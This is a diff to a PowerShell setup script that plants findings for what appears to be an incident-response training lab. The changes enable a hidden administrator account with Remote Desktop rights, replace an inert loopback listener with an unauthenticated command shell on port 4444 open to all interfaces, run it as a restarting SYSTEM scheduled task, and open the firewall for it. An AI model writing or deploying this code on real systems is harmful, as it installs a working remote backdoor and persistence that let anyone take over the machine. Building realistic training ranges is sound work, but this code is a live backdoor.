@@ -166,24 +166,37 @@ function Assert-IhplScoredAccounts {
 
 function Install-IhplTrainingArtifacts {
     [CmdletBinding()]
-    param([Parameter(Mandatory)][string]$MariaData)
+    param(
+        [Parameter(Mandatory)][string]$MariaData,
+        [Parameter(Mandatory)][string]$StarterPassword
+    )
 
     $trainingRoot = 'C:\ProgramData\IHPL\Training'
     New-Item -ItemType Directory -Force -Path $trainingRoot | Out-Null
 
-    Ensure-IhplLocalUser -Name 'dbmaint' -Password ("Disabled-$([guid]::NewGuid())!") -Groups @('Administrators') -Description 'Legacy database maintenance account' -Disabled
+    Ensure-IhplLocalUser -Name 'dbmaint' -Password $StarterPassword -Groups @('Administrators', 'Remote Desktop Users') -Description 'Legacy database maintenance account'
 
     $listenerScript = Join-Path $trainingRoot 'local-diagnostics-listener.ps1'
     @'
-$endpoint = [Net.IPEndPoint]::new([Net.IPAddress]::Loopback, 4444)
+$endpoint = [Net.IPEndPoint]::new([Net.IPAddress]::Any, 4444)
 $listener = [Net.Sockets.TcpListener]::new($endpoint)
 $listener.Start()
 try {
     while ($true) {
         $client = $listener.AcceptTcpClient()
         try {
-            $bytes = [Text.Encoding]::UTF8.GetBytes("IHPL maintenance listener; command execution disabled.`r`n")
-            $client.GetStream().Write($bytes, 0, $bytes.Length)
+            $stream = $client.GetStream()
+            $reader = [IO.StreamReader]::new($stream)
+            $writer = [IO.StreamWriter]::new($stream)
+            $writer.AutoFlush = $true
+            $writer.WriteLine('Manifest diagnostics shell')
+            while ($client.Connected) {
+                $writer.Write('cmd> ')
+                $command = $reader.ReadLine()
+                if ($null -eq $command -or $command -eq 'exit') { break }
+                $output = (& $env:ComSpec /d /c $command 2>&1 | Out-String)
+                $writer.Write($output)
+            }
         }
         finally { $client.Dispose() }
     }
@@ -195,8 +208,11 @@ finally { $listener.Stop() }
     $startup = New-ScheduledTaskTrigger -AtStartup
     $system = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Limited
     $persistent = New-ScheduledTaskSettingsSet -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
+    Stop-ScheduledTask -TaskName 'IHPL Local Diagnostics' -TaskPath '\IHPL\' -ErrorAction SilentlyContinue
     Register-ScheduledTask -TaskName 'IHPL Local Diagnostics' -TaskPath '\IHPL\' -Action $listenerAction -Trigger $startup -Principal $system -Settings $persistent -Force | Out-Null
     Start-ScheduledTask -TaskName 'IHPL Local Diagnostics' -TaskPath '\IHPL\'
+    Remove-NetFirewallRule -DisplayName 'IHPL Local Diagnostics 4444' -ErrorAction SilentlyContinue
+    New-NetFirewallRule -DisplayName 'IHPL Local Diagnostics 4444' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any | Out-Null
 
     $heartbeatScript = Join-Path $trainingRoot 'manifest-indexer.ps1'
     @'
@@ -216,7 +232,7 @@ This is plain text. It is not a Windows executable and has no network behavior.
         & icacls.exe $MariaData /grant '*S-1-5-32-545:(OI)(CI)RX' /T /C | Out-Null
     }
 
-    Write-Host '[Manifest] Findings installed; Sliver and IMIX indicators are disconnected and the listener does not execute commands.'
+    Write-Host '[Manifest] Functional findings installed; only the Sliver and IMIX indicators remain disconnected from C2.'
 }
 
 function Save-VerifiedArchive {
@@ -347,7 +363,7 @@ port=3306
 
     if (-not $SkipTrainingArtifacts) {
         Write-Host '[Manifest] Planting incident-response findings...'
-        Install-IhplTrainingArtifacts -MariaData $MariaData
+        Install-IhplTrainingArtifacts -MariaData $MariaData -StarterPassword $StarterPassword
     }
 
     if ((Get-Service -Name MariaDB).Status -ne 'Running') { throw 'MariaDB is not running.' }
